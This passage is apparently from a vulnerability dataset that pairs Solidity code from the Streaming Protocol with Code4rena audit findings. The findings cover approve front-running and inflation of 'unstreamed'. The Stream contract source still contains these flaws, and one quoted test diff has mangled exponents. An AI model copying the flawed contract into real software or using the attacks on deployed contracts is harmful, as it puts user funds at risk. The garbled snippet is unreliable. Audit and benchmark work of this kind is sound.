b/Streaming/src/test/utils/LockeTest.sol\n@@ -90,11 +90,11 @@ abstract contract LockeTest is TestHelpers {\n         testTokenA = ERC20(address(new TestToken(\"Test Token A\", \"TTA\", 18)));\n         testTokenB = ERC20(address(new TestToken(\"Test Token B\", \"TTB\", 18)));\n         testTokenC = ERC20(address(new TestToken(\"Test Token C\", \"TTC\", 18)));\n       write_balanceOf_ts(address(testTokenA), address(this), (1014)*1018);\n       write_balanceOf_ts(address(testTokenB), address(this), (1014)*1018);\n       write_balanceOf_ts(address(testTokenC), address(this), (1014)*1018);\n       assertEq(testTokenA.balanceOf(address(this)), (1014)*1018);\n       assertEq(testTokenB.balanceOf(address(this)), (1014)*1018);\n+        write_balanceOf_ts(address(testTokenA), address(this), 100*1018);\n+        write_balanceOf_ts(address(testTokenB), address(this), 100*1018);\n+        write_balanceOf_ts(address(testTokenC), address(this), 100*1018);\n+        assertEq(testTokenA.balanceOf(address(this)), 100*1018);\n+        assertEq(testTokenB.balanceOf(address(this)), 100*1018);\n \n         defaultStreamFactory = new StreamFactory(address(this), address(this));\n \n\n\n\nManual Review\n\n",
                "Repair": "\nConsider doing arithmetic operations in two steps or upcasting to u256 and then downcasting. Alternatively, find a threshold where it breaks and add require condition to not allow total stake per user greater than threshhold.\n\nbrockelmore (Streaming Protocol) confirmed(https://github.com/code-423n4/2021-11-streaming-findings/issues/228) \n\n\n\n"
            },
            {
                "Name": "M-05",
                "Location": [
                    "withdraw",
                    "unstreamed",
                    "stake"
                ],
                "Type": " Storage variable unstreamed can be artificially inflated",
                "Description": "\n\nThe storage variable unstreamed keeps track of the global amount of deposit token in the contract that have not been streamed yet. This variable is a public variable, and users that read this variable likely want to use its value to determine whether or not they want to stake in the stream.\n\nThe issue here is that unstreamed is incremented on calls to stake, but it is not being decremented on calls to withdraw. As a result, a malicious user could simply stake, immediately withdraw their staked amount, and they will have increased unstreamed. They could do this repeatedly or with large amounts to intentionally inflate unstreamed to be as large as they want.\n\nOther users would see this large amount and be deterred to stake in the stream, since they would get very little reward relative to the large amount of unstreamed deposit tokens that *appear* to be in the contract. This benefits the attacker as less users will want to stake in the stream, which leaves more rewards for them.\n\n\nSee stake here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417\n\nSee withdraw here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455\n\nNotice that stake increments unstreamed but withdraw does not affect unstreamed at all, even though withdraw is indeed removing unstreamed deposit tokens from the contract.\n\n\nInspection\n\n",
                "Repair": "\nAdd the following line to withdraw to fix this issue:\n\n    unstreamed -= amount;\n\nbrockelmore (Streaming Protocol) confirmed(https://github.com/code-423n4/2021-11-streaming-findings/issues/118#issuecomment-989286529)\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.10;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {DSInvariantTest} from \"./utils/DSInvariantTest.sol\";\n\nimport {MockERC20} from \"./utils/mocks/MockERC20.sol\";\nimport {ERC20User} from \"./utils/users/ERC20User.sol\";\n\ncontract ERC20Test is DSTestPlus {\n    MockERC20 token;\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n    }\n\n    function invariantMetadata() public {\n        assertEq(token.name(), \"Token\");\n        assertEq(token.symbol(), \"TKN\");\n        assertEq(token.decimals(), 18);\n    }\n\n    function testMetaData(\n        string calldata name,\n        string calldata symbol,\n        uint8 decimals\n    ) public {\n        MockERC20 tkn = new MockERC20(name, symbol, decimals);\n        assertEq(tkn.name(), name);\n        assertEq(tkn.symbol(), symbol);\n        assertEq(tkn.decimals(), decimals);\n    }\n\n    function testMint(address from, uint256 amount) public {\n        token.mint(from, amount);\n\n        assertEq(token.totalSupply(), amount);\n        assertEq(token.balanceOf(from), amount);\n    }\n\n    function testBurn(\n        address from,\n        uint256 mintAmount,\n        uint256 burnAmount\n    ) public {\n        if (burnAmount > mintAmount) return;\n\n        token.mint(from, mintAmount);\n        token.burn(from, burnAmount);\n\n        assertEq(token.totalSupply(), mintAmount - burnAmount);\n        assertEq(token.balanceOf(from), mintAmount - burnAmount);\n    }\n\n    function testApprove(address from, uint256 amount) public {\n        assertTrue(token.approve(from, amount));\n\n        assertEq(token.allowance(address(this), from), amount);\n    }\n\n    function testTransfer(address from, uint256 amount) public {\n        token.mint(address(this), amount);\n\n        assertTrue(token.transfer(from, amount));\n        assertEq(token.totalSupply(), amount);\n\n        if (address(this) == from) {\n            assertEq(token.balanceOf(address(this)), amount);\n        } else {\n            assertEq(token.balanceOf(address(this)), 0);\n            assertEq(token.balanceOf(from), amount);\n        }\n    }\n\n    function testTransferFrom(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        if (amount > approval) return;\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), amount);\n\n        from.approve(address(this), approval);\n\n        assertTrue(token.transferFrom(address(from), to, amount));\n        assertEq(token.totalSupply(), amount);\n\n        uint256 app = address(from) == address(this) || approval == type(uint256).max ? approval : approval - amount;\n        assertEq(token.allowance(address(from), address(this)), app);\n\n        if (address(from) == to) {\n            assertEq(token.balanceOf(address(from)), amount);\n        } else {\n            assertEq(token.balanceOf(address(from)), 0);\n            assertEq(token.balanceOf(to), amount);\n        }\n    }\n\n    function testFailTransferFromInsufficientAllowance(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        require(approval < amount);\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), amount);\n        from.approve(address(this), approval);\n        token.transferFrom(address(from), to, amount);\n    }\n\n    function testFailTransferFromInsufficientBalance(\n        address to,\n        uint256 mintAmount,\n        uint256 sendAmount\n    ) public {\n        require(mintAmount < sendAmount);\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), mintAmount);\n        from.approve(address(this), sendAmount);\n        token.transferFrom(address(from), to, sendAmount);\n    }\n}\n\ncontract ERC20Invariants is DSTestPlus, DSInvariantTest {\n    BalanceSum balanceSum;\n    MockERC20 token;\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n        balanceSum = new BalanceSum(token);\n\n        addTargetContract(address(balanceSum));\n    }\n\n    function invariantBalanceSum() public {\n        assertEq(token.totalSupply(), balanceSum.sum());\n    }\n}\n\ncontract BalanceSum {\n    MockERC20 token;\n    uint256 public sum;\n\n    constructor(MockERC20 _token) {\n        token = _token;\n    }\n\n    function mint(address from, uint256 amount) public {\n        token.mint(from, amount);\n        sum += amount;\n    }\n\n    function burn(address from, uint256 amount) public {\n        token.burn(from, amount);\n        sum -= amount;\n    }\n\n    function approve(address to, uint256 amount) public {\n        token.approve(to, amount);\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public {\n        token.transferFrom(from, to, amount);\n    }\n\n    function transfer(address to, uint256 amount) public {\n        token.transfer(to, amount);\n    }\n}\n\n\n",
        "CodeNames": [
            "ERC20.t.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-01",
                "Location": [
                    "approve()",
                    "approve(M)"
                ],
                "Type": " LockeERC20 is vulnerable to frontrun attack",
                "Description": "\n\nA user can steal another user's tokens if he frontrun before he changes the allowance.\n\nThe approve() function receives an amount to change to.\nLets say user A approved user B to take N tokens, and now he wants to change from N to M, if he calls approve(M) the attacker can frontrun, take the N tokens, wait until after the approve transaction, and take another M tokens. And taking N tokens more than the user wanted.\n\n\nManual code review\n\n",
                "Repair": "\nChange the approve function to either accept the old amount of allowance and require the current allowance to be equal to that, or change to two different functions that increase and decrease the allowance instead of straight on changing it.\n\nbrockelmore (Streaming Protocol) acknowledged and disagreed with severity(https://github.com/code-423n4/2021-11-streaming-findings/issues/55)\n\n0xean (judge) commented(https://github.com/code-423n4/2021-11-streaming-findings/issues/55#issuecomment-1013524455):\n  Front running of the approve ERC20 function is pretty well documented and this point and there are some good ways to mitigate this risk.  I am going to downgrade to Medium since there are some other requirements for this to actual mean that assets have been lost\n \n 2 \u2014 Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n \n\n\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.0;\n\nimport \"./LockeERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/tokens/ERC20.sol\";\n\n// ====== Governance =====\ncontract Governed {\n    address public gov;\n    address private pendingGov;\n    address public emergency_gov;\n\n    event NewGov(address indexed oldGov, address indexed newGov);\n    event NewPendingGov(address indexed oldPendingGov, address indexed newPendingGov);\n\n    constructor(address _governor, address _emergency_governor) public {\n        gov = _governor;\n        emergency_gov = _emergency_governor;\n    }\n\n    function governorship() public view returns (address, address, address) {\n        return (gov, emergency_gov, pendingGov);\n    }\n\n    /// Update pending governor\n    function setPendingGov(address newPendingGov) governed public {\n        address old = pendingGov;\n        pendingGov = newPendingGov;\n        emit NewPendingGov(old, newPendingGov);\n    }\n\n    /// Accepts governorship\n    function acceptGov() public {\n        require(pendingGov == msg.sender, \"!pending\");\n        address old = gov;\n        gov = pendingGov;\n        emit NewGov(old, pendingGov);\n    }\n\n    function setEmergencyGov(address who) public governed {\n        emergency_gov = who;\n    } \n\n    /// Remove governor\n    function __abdicate() governed public {\n        address old = gov;\n        gov = address(0);\n        emit NewGov(old, address(0));\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier governed {\n        require(msg.sender == gov, \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier emergency_governed {\n        require(msg.sender == gov || msg.sender == emergency_gov, \"!egov\");\n        _;\n    }\n}\n\ninterface IGoverned {\n    function gov() external view returns (address);\n    function emergency_gov() external view returns (address);\n}\n\nabstract contract ExternallyGoverned {\n    IGoverned public gov;\n\n    constructor(address governor) {\n        gov = IGoverned(governor);\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier externallyGoverned {\n        require(msg.sender == gov.gov(), \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier externallyEmergencyGoverned {\n        require(msg.sender == gov.gov() || msg.sender == gov.emergency_gov(), \"!e_gov\");\n        _;\n    }\n}\n\ninterface LockeCallee {\n    function lockeCall(address initiator, address token, uint256 amount, bytes calldata data) external;\n}\n\n// ====== Stream =====\ncontract Stream is LockeERC20, ExternallyGoverned {\n    using SafeTransferLib for ERC20;    \n    // ======= Structs ========\n    struct TokenStream {\n        uint256 lastCumulativeRewardPerToken;\n        uint256 virtualBalance;\n        uint112 rewards;\n        uint112 tokens;\n        uint32 lastUpdate;\n        bool merkleAccess;\n    }\n\n    // ======= Storage ========\n    // ==== Immutables =====\n    // stream start time\n    uint32 private immutable startTime;\n    // length of stream\n    uint32 private immutable streamDuration;\n    // length of time depositTokens are locked after stream ends\n    uint32 private immutable depositLockDuration;\n    // length of time rewardTokens are locked after stream ends\n    uint32 private immutable rewardLockDuration;\n\n    // end of stream\n    uint32 private immutable endStream;\n    // end of deposit lock\n    uint32 private immutable endDepositLock;\n    // end of reward lock\n    uint32 private immutable endRewardLock;\n\n    // Token given to depositer\n    address public immutable rewardToken;\n    // Token deposited\n    address public immutable depositToken;\n\n    // This stream's id\n    uint64 public immutable streamId;\n\n    // fee percent on reward tokens\n    uint16 private immutable feePercent;\n    // are fees enabled\n    bool private immutable feeEnabled;\n\n    // deposits are basically a *sale* to the stream creator if true\n    bool public immutable isSale;\n\n    // stream creator\n    address public immutable streamCreator;\n\n    uint112 private immutable depositDecimalsOne;\n    // ============\n\n    //  == sloc a ==\n    // internal reward token amount to be given to depositors\n    uint112 private rewardTokenAmount;\n    // internal deposit token amount locked/to be sold to stream creator\n    uint112 private depositTokenAmount;\n    // ============\n\n    // == slot b ==\n    uint112 private rewardTokenFeeAmount;\n    uint112 private depositTokenFlashloanFeeAmount;\n    uint8 private unlocked = 1;\n    bool private claimedDepositTokens;\n    // ============\n\n    // == slot c ==\n    uint256 private cumulativeRewardPerToken;\n    // ============\n\n    // == slot d ==\n    uint256 private totalVirtualBalance;\n    // ============\n\n    // == slot e ==\n    uint112 public unstreamed;\n    uint112 private redeemedDepositTokens;\n    uint32 private lastUpdate;\n    // ============\n\n    // mapping of address to number of tokens not yet streamed over\n    mapping (address => TokenStream) public tokensNotYetStreamed;\n\n    // external incentives to stream creator\n    mapping (address => uint112) public incentives;\n\n    // ======= Events ========\n    event StreamFunded(uint256 amount);\n    event Staked(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event StreamIncentivized(address indexed token, uint256 amount);\n    event StreamIncentiveClaimed(address indexed token, uint256 amount);\n    event SoldTokensClaimed(address indexed who, uint256 amount);\n    event DepositTokensReclaimed(address indexed who, uint256 amount);\n    event FeesClaimed(address indexed token, address indexed who, uint256 amount);\n    event RecoveredTokens(address indexed token, address indexed recipient, uint256 amount);\n    event RewardsClaimed(address indexed who, uint256 amount);\n    event Flashloaned(address indexed token, address indexed who, uint256 amount, uint256 fee);\n\n    // ======= Modifiers ========\n    modifier updateStream(address who) {\n        // save bytecode space by making it a jump instead of inlining at cost of gas\n        updateStreamInternal(who);\n        _;\n    }\n\n    function updateStreamInternal(address who) internal {\n        require(block.timestamp < endStream , \"!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        if (block.timestamp >= startTime) {\n            // set lastUpdates if need be\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = uint32(block.timestamp);\n            }\n\n            // accumulate reward per token info\n            cumulativeRewardPerToken = rewardPerToken();\n\n            // update user rewards\n            ts.rewards = earned(ts, cumulativeRewardPerToken);\n            // update users last cumulative reward per token\n            ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n            // update users unstreamed balance\n            uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;\n            if (acctTimeDelta > 0 && ts.tokens > 0) {\n                // some time has passed since this user last interacted\n                // update ts not yet streamed\n                ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n\n            // handle global unstreamed\n            uint32 tdelta = uint32(block.timestamp - lastUpdate);\n            // stream tokens over\n            if (tdelta > 0 && unstreamed > 0) {\n                uint256 globalStreamingSpeedPerSecond = (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate);\n                unstreamed -= uint112((uint256(tdelta) * globalStreamingSpeedPerSecond) / 10**6);\n            }\n            // already ensure that blocktimestamp is less than endStream so guaranteed ok here\n            lastUpdate = uint32(block.timestamp);\n        } else {\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = startTime;\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = startTime;\n            }\n        }\n    }\n\n\n    function lockInternal() internal {\n        require(unlocked == 1, \"re\");\n        unlocked = 2;\n    }\n    modifier lock {\n        lockInternal();\n        _;\n        unlocked = 1;\n    }\n\n    constructor(\n        uint64 _streamId,\n        address creator,\n        bool _isSale,\n        address _rewardToken,\n        address _depositToken,\n        uint32 _startTime,\n        uint32 _streamDuration,\n        uint32 _depositLockDuration,\n        uint32 _rewardLockDuration,\n        uint16 _feePercent,\n        bool _feeEnabled\n\n    )\n        LockeERC20(_depositToken, _streamId, _startTime + _streamDuration)\n        ExternallyGoverned(msg.sender) // inherit factory governance\n        public \n    {\n        // set fee info\n        feePercent = _feePercent;\n        feeEnabled = _feeEnabled;\n\n        // limit feePercent\n        require(feePercent < 10000, \"fee\");\n    \n        // store streamParams\n        startTime = _startTime;\n        streamDuration = _streamDuration;\n        depositLockDuration = _depositLockDuration;\n        rewardLockDuration = _rewardLockDuration;\n\n        endStream = startTime + streamDuration;\n        endDepositLock = endStream + depositLockDuration;\n        endRewardLock = endStream + rewardLockDuration;\n    \n        // set tokens\n        depositToken = _depositToken;\n        rewardToken = _rewardToken;\n\n        // set streamId\n        streamId = _streamId;\n\n        // set sale info\n        isSale = _isSale;\n    \n        streamCreator = creator;\n\n        depositDecimalsOne = uint112(10**ERC20(depositToken).decimals());\n    }\n\n    /**\n     * @dev Returns relevant internal token amounts\n    **/\n    function tokenAmounts() public view returns (uint112, uint112, uint112, uint112) {\n        return (rewardTokenAmount, depositTokenAmount, rewardTokenFeeAmount, depositTokenFlashloanFeeAmount);\n    }\n\n    /**\n     * @dev Returns fee parameters\n    **/\n    function feeParams() public view returns (uint16, bool) {\n        return (feePercent, feeEnabled);\n    }\n\n    /**\n     * @dev Returns stream parameters\n    **/\n    function streamParams() public view returns (uint32,uint32,uint32,uint32) {\n        return (\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration\n        );\n    }\n\n    function lastApplicableTime() internal view returns (uint32) {\n        return block.timestamp <= endStream ? uint32(block.timestamp) : endStream;\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalVirtualBalance == 0) {\n            return cumulativeRewardPerToken;\n        } else {\n            // \u2206time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance\n            return cumulativeRewardPerToken + (\n                ((uint256(lastApplicableTime()) - lastUpdate) * rewardTokenAmount * depositDecimalsOne/streamDuration) \n                / totalVirtualBalance\n            );\n        }\n    }\n\n    function dilutedBalance(uint112 amount) internal view returns (uint256) {\n        // duration / timeRemaining * amount\n        if (block.timestamp < startTime) {\n            return amount;\n        } else {\n            uint32 timeRemaining = endStream - uint32(block.timestamp);\n            return ((uint256(streamDuration) * amount * 10**6) / timeRemaining) / 10**6;\n        }\n    }\n\n    function getEarned(address who) public view returns (uint256) {\n        TokenStream storage ts = tokensNotYetStreamed[who];\n        return earned(ts, rewardPerToken());\n    }\n\n    function earned(TokenStream storage ts, uint256 currCumRewardPerToken) internal view returns (uint112) {\n        return uint112(ts.virtualBalance * (currCumRewardPerToken - ts.lastCumulativeRewardPerToken) / depositDecimalsOne) + ts.rewards;\n    }\n\n    /**\n     * @dev Allows _anyone_ to fund this stream, if its before the stream start time\n    **/\n    function fundStream(uint112 amount) public lock {\n        require(amount > 0, \"amt\");\n        require(block.timestamp < startTime, \"time\");\n        uint112 amt;\n\n        // transfer from sender\n        uint256 prevBal = ERC20(rewardToken).balanceOf(address(this));\n        ERC20(rewardToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(rewardToken).balanceOf(address(this));\n        require(newBal < type(uint112).max && newBal > prevBal, \"erc\");\n\n        amount = uint112(newBal - prevBal);\n        // if fee is enabled, take a fee\n        if (feeEnabled) {\n            // Safety:\n            //  1. feePercent & y are casted up to u256, so cannot overflow when multiplying\n            //  2. downcast is safe because (x*y)/MAX_X is guaranteed to be smaller than y which is uint112\n            //  3. amount is guaranteed to be greater than feeAmt\n            uint112 feeAmt;\n            unchecked {\n                feeAmt = uint112(uint256(feePercent) * uint256(amount) / 10000); \n                amt = amount - feeAmt;\n            }\n\n            // since this operation can be repeated, we cannot assume no overflow so use checked math\n            rewardTokenFeeAmount += feeAmt;\n            rewardTokenAmount += amt;\n        } else {\n            amt = amount;\n            rewardTokenAmount += amt;\n        }\n        \n        emit StreamFunded(amt);\n    }\n\n    /**\n     *  @dev Deposits depositTokens into this stream\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function stake(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // require(block.timestamp < endStream, \"stake:!stream\");\n\n        // transfer tokens over\n        uint256 prevBal = ERC20(depositToken).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(depositToken).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n        \n        uint112 trueDepositAmt = uint112(newBal - prevBal);\n\n        depositTokenAmount += trueDepositAmt;\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        ts.tokens += trueDepositAmt;\n\n        uint256 virtualBal = dilutedBalance(trueDepositAmt);\n        ts.virtualBalance += virtualBal;\n        totalVirtualBalance += virtualBal;\n        unstreamed += trueDepositAmt;\n\n        if (!isSale) {\n            // not a straight sale, so give the user some receipt tokens\n            _mint(msg.sender, trueDepositAmt);\n        } else {\n        }\n\n        emit Staked(msg.sender, trueDepositAmt);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to withdraw a specific amount of depositTokens during a stream,\n     *  up to their tokensNotYetStreamed amount\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function withdraw(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        require(ts.tokens >= amount, \"amt\");\n        ts.tokens -= amount;\n\n        uint256 virtualBal = dilutedBalance(amount);\n        ts.virtualBalance -= virtualBal;\n        totalVirtualBalance -= virtualBal;\n        depositTokenAmount -= amount;\n        if (!isSale) {\n            _burn(msg.sender, amount);\n        } else {\n        }\n\n        // do the transfer\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to exit their entire remaining tokens that haven't streamed\n     *  and burns receiptTokens if its not a sale.\n     * \n     *  additionally, updates tokensNotYetStreamed. Lock is done in withdraw\n    */ \n    function exit() public updateStream(msg.sender) {\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        uint112 amount = ts.tokens;\n        withdraw(amount);\n    }\n\n    /**\n     *  @dev Allows anyone to incentivize this stream with extra tokens\n     *  and requires the incentive to not be the reward or deposit token\n    */ \n    function createIncentive(address token, uint112 amount) public lock {\n        require(token != rewardToken && token != depositToken, \"inc\");\n        \n        uint256 prevBal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(token).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n\n        uint112 amt = uint112(newBal - prevBal);\n        incentives[token] += amt;\n        emit StreamIncentivized(token, amt);\n    }\n\n    /**\n     *  @dev Allows the stream creator to claim an incentive once the stream is done\n    */ \n    function claimIncentive(address token) public lock {\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        uint112 amount = incentives[token];\n        require(amount > 0, \"amt\");\n        incentives[token] = 0;\n        ERC20(token).safeTransfer(msg.sender, amount);\n        emit StreamIncentiveClaimed(token, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder to reclaim deposit tokens if the deposit lock is done & their receiptToken amount\n     *  is greater than the requested amount\n    */ \n    function claimDepositTokens(uint112 amount) public lock {\n        require(!isSale, \"sale\");\n        // NOTE: given that endDepositLock is strictly *after* the last time withdraw or exit is callable\n        // we dont need to updateStream(msg.sender)\n        require(amount > 0, \"amt\");\n\n        // is the stream over + the deposit lock period over? thats the only time receiptTokens can be burned for depositTokens after stream is over\n        require(block.timestamp > endDepositLock, \"lock\");\n\n        // burn the receiptTokens\n        _burn(msg.sender, amount);\n\n        redeemedDepositTokens += amount;\n\n        // send the receipt token holder back the funds\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit DepositTokensReclaimed(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder (or original depositor in case of a sale) to claim their rewardTokens\n    */ \n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        // update user rewards\n        ts.rewards = earned(ts, cumulativeRewardPerToken);\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        uint256 rewardAmt = ts.rewards;\n        ts.rewards = 0;\n\n        require(rewardAmt > 0, \"amt\");\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n\n    /**\n     *  @dev Allows a creator to claim sold tokens if the stream has ended & this contract is a sale\n    */ \n    function creatorClaimSoldTokens(address destination) public lock {\n        // can only claim when its a sale\n        require(isSale, \"!sale\");\n\n        // only can claim once\n        require(!claimedDepositTokens, \"claimed\");\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        \n        uint112 amount = depositTokenAmount;\n        claimedDepositTokens = true;\n\n        ERC20(depositToken).safeTransfer(destination, amount);\n\n        emit SoldTokensClaimed(destination, amount);\n    }\n\n    /**\n     *  @dev Allows the governance contract of the factory to select a destination\n     *  and transfer fees (in rewardTokens) to that address totaling the total fee amount\n    */ \n    function claimFees(address destination) public lock externallyGoverned {\n        // Stream is done\n        require(block.timestamp >= endStream, \"stream\");\n\n        // reset fee amount\n        uint112 fees = rewardTokenFeeAmount;\n        if (fees > 0) {\n            rewardTokenFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(rewardToken).safeTransfer(destination, fees);\n            emit FeesClaimed(rewardToken, destination, fees);\n        }\n\n        fees = depositTokenFlashloanFeeAmount;\n        if (fees > 0) {\n            depositTokenFlashloanFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(depositToken).safeTransfer(destination, fees);\n\n            emit FeesClaimed(depositToken, destination, fees);\n        }\n        \n    }\n\n    // ======== Non-protocol functions ========\n\n    /**\n     *  @dev Allows the stream creator to save tokens\n     *  There are some limitations to this:\n     *      1. if its deposit token:\n     *          - DepositLock is fully done\n     *          - There are excess deposit tokens (balance - depositTokenAmount)\n     *      2. if its the reward token:\n     *          - RewardLock is fully done\n     *          - Excess defined as balance - (rewardTokenAmount + rewardTokenFeeAmount)\n     *      3. if incentivized:\n     *          - excesss defined as bal - incentives[token]\n    */ \n    function recoverTokens(address token, address recipient) public lock {\n        // NOTE: it is the stream creators responsibility to save\n        // tokens on behalf of their users.\n        require(msg.sender == streamCreator, \"!creator\");\n        if (token == depositToken) {\n            require(block.timestamp > endDepositLock, \"time\");\n            // get the balance of this contract\n            // check what isnt claimable by either party\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n            // allow saving of the token\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n        \n        if (token == rewardToken) {\n            require(block.timestamp > endRewardLock, \"time\");\n            // check current balance vs internal balance\n            //\n            // NOTE: if a token rebases, i.e. changes balance out from under us,\n            // most of this contract breaks and rugs depositors. this isn't exclusive\n            // to this function but this function would in theory allow someone to rug\n            // and recover the excess (if it is worth anything)\n\n            // check what isnt claimable by depositors and governance\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        if (incentives[token] > 0) {\n            require(block.timestamp >= endStream, \"stream\");\n            uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n            ERC20(token).safeTransfer(recipient, excess);\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        // not reward token nor deposit nor incentivized token, free to transfer\n        uint256 bal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransfer(recipient, bal);\n        emit RecoveredTokens(token, recipient, bal);\n    }\n\n    /**\n     *  @dev Allows anyone to flashloan reward or deposit token for a 10bps fee\n    */\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n            require(preDepositTokenBalance + feeAmt <= postDepositTokenBalance, \"f1\");\n            require(preRewardTokenBalance <= postRewardTokenBalance, \"f2\");\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n            require(preDepositTokenBalance <= postDepositTokenBalance, \"f3\");\n            require(preRewardTokenBalance + feeAmt <= postRewardTokenBalance, \"f4\");\n        }\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n\n    /**\n     *  @dev Allows inherited governance contract to call functions on behalf of this contract\n     *  This is a potentially dangerous function so to ensure trustlessness, *all* balances\n     *  that may matter are guaranteed to not change.\n     * \n     *  The primary usecase is for claiming potentially airdrops that may have accrued on behalf of this contract\n    */\n    function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n        // cannot have an active incentive for the callee\n        require(incentives[who] == 0, \"inc\");\n        // cannot be to deposit token nor reward token\n        require(who != depositToken && who != rewardToken, \"erc\");\n\n        // get token 